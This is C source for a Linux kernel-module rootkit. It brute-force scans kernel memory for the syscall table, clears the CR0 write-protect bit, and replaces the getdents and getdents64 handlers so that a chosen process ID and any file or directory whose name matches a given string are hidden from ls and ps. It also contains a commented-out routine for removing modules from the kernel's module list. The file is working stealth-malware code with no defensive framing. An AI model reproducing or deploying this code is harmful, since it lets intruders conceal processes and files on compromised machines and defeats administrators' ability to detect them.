#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/unistd.h>
#include <asm/pgtable.h>
#include <linux/slab.h>
#include <linux/syscalls.h>
#include <linux/types.h>
#include <linux/mutex.h>
#include <linux/kallsyms.h>
#include <linux/sched.h>
#include <linux/kernfs.h>
#include <linux/rbtree.h>
#include <linux/hash.h>
#include <linux/dirent.h>

struct linux_dirent {
	unsigned long  d_ino;     /* Inode number */
	unsigned long  d_off;     /* Offset to next linux_dirent */
	unsigned short d_reclen;  /* Length of this linux_dirent */
	char           d_name[];  /* Filename (null-terminated) */
};

unsigned long cr0;
static unsigned long *sys_call_table;

typedef asmlinkage long (*orig_getdents_t)(unsigned int, struct linux_dirent *, unsigned int);
orig_getdents_t orig_getdents;

typedef asmlinkage long (*orig_getdents_t64)(unsigned int, struct linux_dirent64 *, unsigned int);
orig_getdents_t64 orig_getdents64;

#define START_MEM PAGE_OFFSET
#define END_MEM ULONG_MAX

static char *hide_mod = "";
static char *hide_dir = "N0TH1NG";
static int hide_pid = -1;

module_param(hide_mod, charp, 0000); // which lkm should be deleted from kernel structures
module_param(hide_dir, charp, 0000); // which directory/file should be hidden from ls
module_param(hide_pid, int, 0000);	 // which pid process should be hidden from ps
MODULE_LICENSE("GPL v2"); // this actually solves a lot of bugs

// get syscall table dinamically
unsigned long *
get_syscall_table_bf(void) {
    unsigned long *syscall_table;
    unsigned long int i;

    for(i=START_MEM; i<END_MEM; i+=sizeof(void *)){
        syscall_table = (unsigned long *)i;

        if (syscall_table[__NR_close] == (unsigned long)sys_close)
            return syscall_table;
    }
    return NULL;
}

// getdents hook
asmlinkage static long
hacked_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){
    struct linux_dirent *t1, *t2;
    int next, hide;
    unsigned long hpid, nwarm;
	long or, tmp;
    
	or = (*orig_getdents)(fd, dirp, count);
    if(!or) return 0;

    t2 = (struct linux_dirent *) kmalloc(or, GFP_KERNEL);
    __copy_from_user(t2, dirp, or);
    t1 = t2;
    tmp = or;

    while(tmp > 0){
        tmp -= t1->d_reclen;
        next = 1;
        hide = 0;

        // ps->find
        hpid = simple_strtoul(t1->d_name, NULL, 10);
		if(hide_pid == hpid){
            struct task_struct *htask = current;
            do{
                if(htask->pid == hpid){ 
                    hide = 1;
                    break;
                }
                htask = next_task(htask);
            } while(htask != current);
        }

		// ls + ps->hide
        if(hide || strstr(t1->d_name, hide_dir)){
            or -= t1->d_reclen;
            next = 0;
            if(tmp) memmove(t1, (char *) t1 + t1->d_reclen, tmp);
        }

        if(tmp && next) t1 = (struct linux_dirent *) ((char *) t1 + t1->d_reclen);
    }

    nwarm = __copy_to_user((void *) dirp, (void *) t2, or);
    kfree(t2);

    return or;
}

asmlinkage static long fake_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
    long total_bytes, bytes_remaining;
    struct linux_dirent *real_dents, *dent;

    // Get real directory entries:
    if ((total_bytes = (*orig_getdents)(fd, dirp, count)) == 0) {
        // If number of entries is 0, return 0:
        return 0;
    }

    // Allocate kernel-space buffer to store real directory entries:
    real_dents = (struct linux_dirent *) kmalloc(total_bytes, GFP_KERNEL);

    // Copy real directory entries from user-space buffer to kernel-space buffer:
    __copy_from_user(real_dents, dirp, total_bytes);

    // Use a pointer to iterate through entries:
    dent = real_dents;

    // While there are entries to be processed:
    bytes_remaining = total_bytes;
    while (bytes_remaining > 0) {

        // Update remaining bytes to go through:
        bytes_remaining -= dent->d_reclen;

        // If current entry points to directory of process to be hidden or to file to be hidden:
        if (simple_strtoul(dent->d_name, NULL, 10) == hide_pid || strstr(dent->d_name, hide_dir)) {
            // Decrease number of total bytes since the entry will be removed:
            total_bytes -= dent->d_reclen;

            // Shift next entries up so the current entry will be overwritten:
            memmove(dent, (char *) dent + dent->d_reclen, bytes_remaining);

            // Since the entries were shifted, the current pointer points to a different entry, so no need to update it.
        }
        else {
            // Point to next entry:
            dent = (struct linux_dirent *) ((char *) dent + dent->d_reclen);
        }
    }

    // Copy fake entry list to user-space buffer:
    __copy_to_user((void *) dirp, (void *) real_dents, total_bytes);

    // Deallocate kernel-space buffer:
    kfree(real_dents);

    // Return fake size of directory entry list:
    return total_bytes;
}

//getdents64 hook
asmlinkage static long
hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count){
    struct linux_dirent64 *t1, *t2;
    int next, hide;
    unsigned long hpid, nwarm;
	long or, tmp;
    
	or = (*orig_getdents64)(fd, dirp, count);
    if(!or) return 0;

    t2 = (struct linux_dirent64 *) kmalloc(or, GFP_KERNEL);
    __copy_from_user(t2, dirp, or);
    t1 = t2;
    tmp = or;

    while(tmp > 0){
        tmp -= t1->d_reclen;
        next = 1;
        hide = 0;

        // ps->find
        hpid = simple_strtoul(t1->d_name, NULL, 10);
		if(hide_pid == hpid){
            struct task_struct *htask = current;
            do{
                if(htask->pid == hpid){ 
                    hide = 1;
                    break;
                }
                htask = next_task(htask);
            } while(htask != current);
        }

		// ls + ps->hide
        if(hide || strstr(t1->d_name, hide_dir)){
            or -= t1->d_reclen;
            next = 0;
            if(tmp) memmove(t1, (char *) t1 + t1->d_reclen, tmp);
        }

        if(tmp && next) t1 = (struct linux_dirent64 *) ((char *) t1 + t1->d_reclen);
    }

    nwarm = __copy_to_user((void *) dirp, (void *) t2, or);
    kfree(t2);

    return or;
}

static void module_hide(struct module *mod){
    /*
    list_del(&mod->list);
    kobject_del(&mod->mkobj.kobj);
    list_del(&mod->mkobj.kobj.entry);
    */
}

static int __init
syshook_init(void) {
    sys_call_table = (unsigned long *)get_syscall_table_bf();
    cr0 = read_cr0();

    // hide this lkm
    module_hide(THIS_MODULE);

    // hide another lkm (lsmod)
    if(strcmp(hide_mod, "") != 0){
        struct module *mod;

        mutex_lock(&module_mutex);
        mod = find_module(hide_mod);
        mutex_unlock(&module_mutex);

        if(mod) module_hide(mod);
    }

    //// serious stuff
    if(sys_call_table == NULL){
        printk(KERN_INFO "sys_call_table not fount");
        return -1;
    }

	// back up original syscalls addresses
    orig_getdents = (orig_getdents_t)sys_call_table[__NR_getdents];
    orig_getdents64 = (orig_getdents_t64)sys_call_table[__NR_getdents64];

	// overwrite their addresses
    write_cr0(cr0 & ~0x00010000);
    sys_call_table[__NR_getdents] = (unsigned long)fake_getdents;
    sys_call_table[__NR_getdents64] = (unsigned long)hacked_getdents64;
    write_cr0(cr0);

    return 0;
}

static void __exit
syshook_cleanup(void){
    if(orig_getdents){
        write_cr0(cr0 & ~0x00010000);
        sys_call_table[__NR_getdents] = (unsigned long)orig_getdents;
        write_cr0(cr0);
    }
    if(orig_getdents64){
        write_cr0(cr0 & ~0x00010000);
        sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
        write_cr0(cr0);
    }
}

module_init(syshook_init);
module_exit(syshook_cleanup);